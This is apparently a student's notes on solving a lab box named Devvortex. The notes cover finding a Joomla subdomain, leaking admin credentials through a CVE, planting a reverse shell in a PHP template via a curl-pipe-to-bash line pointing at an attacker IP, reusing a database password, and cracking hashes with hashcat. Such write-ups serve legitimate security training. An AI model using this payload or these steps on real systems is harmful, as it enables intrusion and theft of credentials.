## Enumeration 
- so this has ssh and http open
-  i tried some very basic sql injection into the contact us and the subscribe but it doesnt seem to do much
- tried gobuster for subdomains or directories and found nothing
## ANSWER
- so I needed to make sure to add `--append-domain` to gobuster at the end to actually make it look for subdomains
- Then we found dev.devvortex.htb, so we add it to /etc/hosts so that it's mapped to the same ip
- then when we access it we find out it's using Joomla for its CMS (content management system like wordpress) 
- We find out that for joomla there is a certain path to add /api/something somethign (looked it up), and it shows you the version that is being used.
- We look up the version and the cve's that it has, and we find a information disclosure vulnerability.
	- You can add a path in the link and find the users and passwords
- Then we are able to access that administrator page through lewis's admin privaleges
### Remote Shell
- we can open a python server on our machine with a shell in the  same folder
- we can edit the templates php files to make it connect to our python server and pass the shell script 
- `<?php system("curl 10.10.14.3:1234/rev.sh | bash"); ?>`
- we open netcat on the port that we specified and 
- run `ss -tlpn`, which is socket statistics (like netstat). t shows tcp, l shows listening, p shows show the process  name and PID, n shows ports in numeric form
- we see that ports 3306 and 33060 are open which usually use mysql
- we see that in configuration.php the user lewis still uses the same password on the sql server so we log in
- we list users and their passwords
- run hashid 'hash' to figure out the type of has to put into hashmode in hashcat or just run hashcat with no mode and it ill tell you the most likely modes
- hashcat -m [hashmode] -a [attack mode, usually 0] hash.txt /usr/share/wordlists/rockyou.txt